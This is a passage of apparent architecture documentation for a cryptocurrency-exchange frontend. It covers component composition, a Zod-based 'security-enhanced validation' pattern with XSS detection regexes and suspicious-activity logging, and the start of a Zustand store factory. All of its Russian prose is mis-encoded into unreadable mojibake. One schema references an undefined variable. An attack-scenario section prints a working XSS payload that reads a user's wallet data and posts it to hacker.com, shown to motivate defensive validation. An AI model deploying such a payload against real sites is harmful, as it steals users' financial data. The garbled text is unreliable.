- –ö–æ–º–ø–æ–Ω–µ–Ω—Ç –∏–º–µ–µ—Ç –±–æ–ª–µ–µ 5-7 –ª–æ–≥–∏—á–µ—Å–∫–∏—Ö —Å–µ–∫—Ü–∏–π
- –ï—Å—Ç—å –æ–±—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –º–µ–∂–¥—É —Å–µ–∫—Ü–∏—è–º–∏
- –ù—É–∂–Ω–∞ –≥–∏–±–∫–∞—è –∫–æ–º–ø–æ–∑–∏—Ü–∏—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
- –°–µ–∫—Ü–∏–∏ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —Ä–∞–∑–Ω—ã—Ö –∫–æ–º–±–∏–Ω–∞—Ü–∏—è—Ö

**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `exchange-form.tsx`, `data-table-compound.tsx`, `header-compound.tsx`

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –í–º–µ—Å—Ç–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ —Å 20+ –ø—Ä–æ–ø—Å–∞–º–∏ –ø–æ–ª—É—á–∞–µ–º –≥–∏–±–∫—É—é —Å–∏—Å—Ç–µ–º—É –±–ª–æ–∫–æ–≤, –∫–æ—Ç–æ—Ä—É—é –ª–µ–≥–∫–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∏ —Ä–∞—Å—à–∏—Ä—è—Ç—å.

---

### üîí **–ü–∞—Ç—Ç–µ—Ä–Ω 2: Security-Enhanced Validation (–ó–∞—â–∏—â–µ–Ω–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ —Ñ–æ—Ä–º—ã –∏ API (`packages/utils/src/validation/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –º–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ –≤ –±–∞–Ω–∫–µ

#### üß† **–î–ï–¢–ê–õ–¨–ù–û–ï –û–ë–™–Ø–°–ù–ï–ù–ò–ï –ü–ê–¢–¢–ï–†–ù–ê**

**–ü—Ä–æ–±–ª–µ–º–∞ –∫–æ—Ç–æ—Ä—É—é —Ä–µ—à–∞–µ—Ç:**
–§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è - –≥–ª–∞–≤–Ω–∞—è —Ü–µ–ª—å –¥–ª—è —Ö–∞–∫–µ—Ä–æ–≤. –û–±—ã—á–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Ç–æ–ª—å–∫–æ —Ñ–æ—Ä–º–∞—Ç –¥–∞–Ω–Ω—ã—Ö, –Ω–æ –Ω–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç:

1. **XSS –∞—Ç–∞–∫–∏** - –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—Å—Ç–∞–≤–ª—è–µ—Ç JavaScript –∫–æ–¥
2. **Injection –∞—Ç–∞–∫–∏** - –ø–æ–ø—ã—Ç–∫–∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
3. **Data manipulation** - –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –¥–∞–Ω–Ω—ã—Ö (—Å—É–º–º, –∫—É—Ä—Å–æ–≤)

```typescript
// ‚ùå –û–ø–∞—Å–Ω–æ –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
const transferSchema = z.object({
  amount: z.number(), // –ú–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º!
  recipient: z.string(), // –ú–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å <script>!
  orderId: z.string(), // –ú–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–¥–¥–µ–ª–∞–Ω!
});
```

**–†–µ—à–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Security-Enhanced Validation:**

```typescript
// ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
export const securityEnhancedTransferSchema = z.object({
  amount: z
    .number()
    .positive('–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π')
    .max(1000000, '–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏')
    .refine(val => !isManipulatedNumber(val), '–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è —Å—É–º–º–∞'),

  recipient: z
    .string()
    .min(1, '–ü–æ–ª—É—á–∞—Ç–µ–ª—å –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω')
    .max(100, '–°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –∞–¥—Ä–µ—Å')
    .transform(sanitizeHtml)
    .refine(val => !containsPotentialXSS(val), '–û–±–Ω–∞—Ä—É–∂–µ–Ω XSS –∫–æ–¥')
    .refine(val => isValidWalletAddress(val), '–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞'),

  orderId: z
    .string()
    .regex(/^order_\d{13,}_[a-zA-Z0-9]{8,}$/, '–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID –∑–∞–∫–∞–∑–∞')
    .refine(val => !isExpiredOrderId(val), '–ó–∞–∫–∞–∑ —É—Å—Ç–∞—Ä–µ–ª')
    .refine(val => !containsPotentialXSS(val), '–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π ID'),
});
```

#### üîß **–ö–ê–ö –≠–¢–û –†–ê–ë–û–¢–ê–ï–¢ –¢–ï–•–ù–ò–ß–ï–°–ö–ò**

**1. –ú–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:**

```typescript
// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ XSS –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤
export const containsPotentialXSS = (input: string): boolean => {
  const xssPatterns = [
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, // <script> —Ç–µ–≥–∏
    /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, // <iframe> —Ç–µ–≥–∏
    /javascript:/gi, // javascript: –ø—Ä–æ—Ç–æ–∫–æ–ª
    /on\w+\s*=\s*["'][^"']*["']/gi, // —Å–æ–±—ã—Ç–∏—è onclick, onload –∏ —Ç.–¥.
    /data:text\/html/gi, // data: URLs
    /vbscript:/gi, // VBScript
    /expression\s*\(/gi, // CSS expressions
  ];

  return xssPatterns.some(pattern => pattern.test(input));
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö —á–∏—Å–µ–ª
export const isManipulatedNumber = (amount: number): boolean => {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ø–æ–ø—ã—Ç–∫–∏ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—è
  if (amount > Number.MAX_SAFE_INTEGER) return true;

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ø–æ–ø—ã—Ç–∫–∏ –æ–±—Ö–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é NaN/Infinity
  if (!Number.isFinite(amount)) return true;

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ø–æ–ø—ã—Ç–∫–∏ –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤
  if (amount < 0) return true;

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, 0.0000001)
  const stringValue = amount.toString();
  if (stringValue.includes('e-') && amount < 0.01) return true;

  return false;
};
```

**2. –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π:**

```typescript
// –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è –∑–∞–∫–∞–∑–æ–≤ –Ω–∞ –æ–±–º–µ–Ω
export const createOrderValidation = (userTier: 'basic' | 'verified' | 'premium') => {
  const limits = {
    basic: { maxAmount: 1000, dailyLimit: 5000 },
    verified: { maxAmount: 10000, dailyLimit: 50000 },
    premium: { maxAmount: 100000, dailyLimit: 500000 },
  };

  return z.object({
    fromAmount: z
      .number()
      .positive()
      .max(limits[userTier].maxAmount, `–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç –¥–ª—è ${userTier} –∞–∫–∫–∞—É–Ω—Ç–∞`)
      .refine(val => isDailyLimitOk(val, userTier), '–ü—Ä–µ–≤—ã—à–µ–Ω –¥–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç'),

    fromCurrency: z
      .enum(['BTC', 'ETH', 'USDT', 'LTC'])
      .refine(val => isCurrencyAvailable(val), '–í–∞–ª—é—Ç–∞ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞'),

    toWallet: z
      .string()
      .refine(val => isValidWalletForCurrency(val, fromCurrency), '–ö–æ—à–µ–ª–µ–∫ –Ω–µ —Å–æ–≤–º–µ—Å—Ç–∏–º —Å –≤–∞–ª—é—Ç–æ–π')
      .refine(val => !isBlacklistedWallet(val), '–ö–æ—à–µ–ª–µ–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'),
  });
};
```

**3. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏:**

```typescript
export const withSecurityLogging = <T>(schema: z.ZodSchema<T>) => {
  return schema.refine(data => {
    const violations = [];

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ XSS
    if (hasXSSAttempt(data)) {
      violations.push('XSS_ATTEMPT');
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ SQL injection
    if (hasSQLInjection(data)) {
      violations.push('SQL_INJECTION_ATTEMPT');
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏
    if (isSuspiciousFinancialActivity(data)) {
      violations.push('SUSPICIOUS_FINANCIAL_ACTIVITY');
    }

    if (violations.length > 0) {
      // –õ–æ–≥–∏—Ä—É–µ–º –≤ —Å–∏—Å—Ç–µ–º—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
      securityLogger.warn('Security violation detected', {
        violations,
        input: sanitizeForLogging(data),
        userAgent: getCurrentUserAgent(),
        ip: getCurrentIP(),
        timestamp: new Date(),
      });

      return false;
    }

    return true;
  }, '–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å');
};
```

#### üéØ **–ü–†–ï–ò–ú–£–©–ï–°–¢–í–ê –î–õ–Ø –§–ò–ù–ê–ù–°–û–í–û–ì–û –ü–†–ò–õ–û–ñ–ï–ù–ò–Ø**

**1. –ó–∞—â–∏—Ç–∞ –¥–µ–Ω–µ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:**

```typescript
// –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –ø–æ–ø—ã—Ç–∫–∏ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ —Å—É–º–º—ã
amount: -1000; // ‚ùå –û—Ç–∫–ª–æ–Ω–µ–Ω–æ: "–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π"

// –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –ø–µ—Ä–µ–≤–æ–¥—ã –Ω–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏
wallet: '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'; // ‚ùå –û—Ç–∫–ª–æ–Ω–µ–Ω–æ: "–ö–æ—à–µ–ª–µ–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω"
```

**2. –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –∫—Ä–∞–∂–∏ –¥–∞–Ω–Ω—ã—Ö:**

```typescript
// XSS –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ –ø–æ–ª–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è
comment: '–û—Ç–ª–∏—á–Ω–æ! <script>steal_cookies()</script>';
// ‚úÖ –û—á–∏—â–µ–Ω–æ –¥–æ: "–û—Ç–ª–∏—á–Ω–æ!"
// ‚úÖ –ó–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–æ –≤ –ª–æ–≥–∞—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
```

**3. –°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã–º —Ä–µ–≥—É–ª—è—Ç–∏–≤–Ω—ã–º —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º:**

- –í—Å–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –Ω–∞ –ª–∏–º–∏—Ç—ã
- –ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ª–æ–≥–∏—Ä—É–µ—Ç—Å—è
- –ù–µ–ª—å–∑—è –æ–±–æ–π—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–æ–¥

#### ‚ö†Ô∏è **–†–ï–ê–õ–¨–ù–´–ï –°–¶–ï–ù–ê–†–ò–ò –ê–¢–ê–ö –ë–ï–ó –≠–¢–û–ì–û –ü–ê–¢–¢–ï–†–ù–ê**

**–ê—Ç–∞–∫–∞ ‚Ññ1: –ö—Ä–∞–∂–∞ —á–µ—Ä–µ–∑ XSS –≤ –ø–æ–ª–µ "–û–ø–∏—Å–∞–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–∞"**

```typescript
// ‚ùå –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è
const paymentSchema = z.object({
  description: z.string().max(200), // –¢–æ–ª—å–∫–æ –¥–ª–∏–Ω–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è
});

// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å–æ–∑–¥–∞–µ—Ç –ø–ª–∞—Ç–µ–∂ —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º:
const maliciousDescription = `
  –û–ø–ª–∞—Ç–∞ —É—Å–ª—É–≥
  <img src="x" onerror="
    fetch('/api/user/wallet')
      .then(r => r.json())
      .then(data => {
        fetch('http://hacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
  ">
`;

// –ö–æ–≥–¥–∞ –∞–¥–º–∏–Ω –∏–ª–∏ –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–≤–∏–¥–∏—Ç —ç—Ç–æ—Ç –ø–ª–∞—Ç–µ–∂,
// JavaScript –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –∏ —É–∫—Ä–∞–¥–µ—Ç –¥–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∞!
```

**–ê—Ç–∞–∫–∞ ‚Ññ2: –û–±—Ö–æ–¥ –ª–∏–º–∏—Ç–æ–≤ —á–µ—Ä–µ–∑ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—é —á–∏—Å–µ–ª**

```typescript
// ‚ùå –ü—Ä–æ—Å—Ç–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è —Å—É–º–º—ã
const exchangeSchema = z.object({
  amount: z.number().positive(), // –¢–æ–ª—å–∫–æ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ
});

// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç JavaScript –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:
const attackAmount = 1e-10; // –û—á–µ–Ω—å –º–∞–ª–µ–Ω—å–∫–æ–µ —á–∏—Å–ª–æ
// –ò–ª–∏: Number.MAX_VALUE (–±–µ—Å–∫–æ–Ω–µ—á–Ω–æ –±–æ–ª—å—à–æ–µ)
// –ò–ª–∏: parseFloat("1000.00\x00spam") = 1000

// –°–∏—Å—Ç–µ–º–∞ –º–æ–∂–µ—Ç –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —Ç–∞–∫–∏–µ —á–∏—Å–ª–∞
// –∏ –ø–æ–∑–≤–æ–ª–∏—Ç—å –æ–±–æ–π—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
```

#### üõ†Ô∏è **–ö–û–ì–î–ê AI –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò –ü–†–ò–ú–ï–ù–Ø–ï–¢ –≠–¢–û–¢ –ü–ê–¢–¢–ï–†–ù**

**–û–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ —Å–ª—É—á–∞–∏:**

- ‚úÖ –õ—é–±—ã–µ –ø–æ–ª—è —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –¥–µ–Ω—å–≥–∞–º–∏ (—Å—É–º–º—ã, –∫—É—Ä—Å—ã, –∫–æ–º–∏—Å—Å–∏–∏)
- ‚úÖ –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –∏ –∑–∞–∫–∞–∑–æ–≤
- ‚úÖ –ê–¥—Ä–µ—Å–∞ –∫–æ—à–µ–ª—å–∫–æ–≤ –∏ –±–∞–Ω–∫–æ–≤—Å–∫–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã
- ‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –∏ –æ–ø–∏—Å–∞–Ω–∏—è
- ‚úÖ –ü–∞—Ä–∞–º–µ—Ç—Ä—ã API –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π

**–£—Ä–æ–≤–Ω–∏ –∑–∞—â–∏—Ç—ã –ø–æ —Ç–∏–ø—É –¥–∞–Ω–Ω—ã—Ö:**

```typescript
// –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ - —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
const criticalFinancialData = withSecurityLogging(
  withFinancialValidation(withXSSProtection(baseSchema))
);

// –°—Ä–µ–¥–Ω—è—è –∑–∞—â–∏—Ç–∞ - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç
const userContent = withXSSProtection(withBasicSanitization(baseSchema));

// –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞ - –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ –¥–∞–Ω–Ω—ã–µ
const internalData = withBasicValidation(baseSchema);
```

**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**:

- `security-enhanced-utils.ts` - –æ—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- `security-enhanced-support-schemas.ts` - —Å—Ö–µ–º—ã –¥–ª—è —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∏
- `financial-validation.ts` - —Å–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ö–∞–∂–¥—ã–π –≤–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞—â–∏—â–µ–Ω –æ—Ç –æ—Å–Ω–æ–≤–Ω—ã—Ö –≤–µ–∫—Ç–æ—Ä–æ–≤ –∞—Ç–∞–∫, –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –Ω–µ –∑–∞–º–µ—á–∞—é—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫, –Ω–æ –∏—Ö –¥–µ–Ω—å–≥–∏ –∏ –¥–∞–Ω–Ω—ã–µ –Ω–∞–¥–µ–∂–Ω–æ –∑–∞—â–∏—â–µ–Ω—ã.

---

### üè™ **–ü–∞—Ç—Ç–µ—Ä–Ω 3: Store Factory (–§–∞–±—Ä–∏–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ Zustand stores (`packages/hooks/src/state/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ —à–∞–±–ª–æ–Ω –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ–¥–∏–Ω–∞–∫–æ–≤—ã—Ö –º–∞–≥–∞–∑–∏–Ω–æ–≤ –≤ —Ç–æ—Ä–≥–æ–≤–æ–π —Å–µ—Ç–∏

#### üß† **–î–ï–¢–ê–õ–¨–ù–û–ï –û–ë–™–Ø–°–ù–ï–ù–ò–ï –ü–ê–¢–¢–ï–†–ù–ê**

**–ü—Ä–æ–±–ª–µ–º–∞ –∫–æ—Ç–æ—Ä—É—é —Ä–µ—à–∞–µ—Ç:**
–í –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö –æ–±–º–µ–Ω–∞ –≤–∞–ª—é—Ç –º–Ω–æ–≥–æ –ø–æ—Ö–æ–∂–∏—Ö —Å–æ—Å—Ç–æ—è–Ω–∏–π: —Å–ø–∏—Å–æ–∫ –≤–∞–ª—é—Ç, –∏—Å—Ç–æ—Ä–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π, –∫—É—Ä—Å—ã –æ–±–º–µ–Ω–∞, –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ë–µ–∑ –ø–∞—Ç—Ç–µ—Ä–Ω–∞ –∫–∞–∂–¥—ã–π store —Å–æ–∑–¥–∞–µ—Ç—Å—è –æ—Ç–¥–µ–ª—å–Ω–æ —Å –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ–º –∫–æ–¥–∞:

```typescript
// ‚ùå –î—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ –≤ –∫–∞–∂–¥–æ–º store
const useCurrencyStore = create((set, get) => ({
  data: [],
  isLoading: false,
  error: null,
  fetch: async () => {
    /* –ª–æ–≥–∏–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ */
  },
  // –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å devtools!
  // –ó–∞–±—ã–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å persisting!
  // –ù–µ—Ç —É–Ω–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫!
}));

const useOrderStore = create((set, get) => ({
  data: [],
  isLoading: false,
  error: null,
  fetch: async () => {
    /* —Ç–∞ –∂–µ –ª–æ–≥–∏–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ */
  },
  // –û–ø—è—Ç—å –¥—É–±–ª–∏—Ä—É–µ–º –∫–æ–¥...
}));
```

**–†–µ—à–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Store Factory:**

```typescript
// ‚úÖ –°–æ–∑–¥–∞–µ–º stores —Å –≥–æ—Ç–æ–≤–æ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–æ–π
export const useCurrencyStore = createStore('currency', (set, get) => ({
  currencies: [],
  selectedCurrency: null,

  // –¢–æ–ª—å–∫–æ —É–Ω–∏–∫–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –≤–∞–ª—é—Ç
  setCurrency: currency => set({ selectedCurrency: currency }),
  getCurrencyRate: (from, to) => {
    /* —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–∞—è –ª–æ–≥–∏–∫–∞ */
  },
}));

export const useOrderStore = createStore('orders', (set, get) => ({
  orders: [],
  activeOrder: null,

  // –¢–æ–ª—å–∫–æ —É–Ω–∏–∫–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –∑–∞–∫–∞–∑–æ–≤
  setActiveOrder: order => set({ activeOrder: order }),
  cancelOrder: orderId => {
    /* —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–∞—è –ª–æ–≥–∏–∫–∞ */
  },
}));
```

#### üîß **–ö–ê–ö –≠–¢–û –†–ê–ë–û–¢–ê–ï–¢ –¢–ï–•–ù–ò–ß–ï–°–ö–ò**

**1. –§–∞–±—Ä–∏—á–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—è–º–∏:**

```typescript
export const createStore = <T extends object>(
  name: string,
  storeDefinition: StateCreator<T & BaseStoreState>
) => {
  return create<T & BaseStoreState>()(
    devtools(
      subscribeWithSelector(
        persist(
          immer((set, get, api) => ({
            // –ë–∞–∑–æ–≤–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–µ –ø–æ–ª—É—á–∞–µ—Ç –∫–∞–∂–¥—ã–π store
            ...baseStoreState,

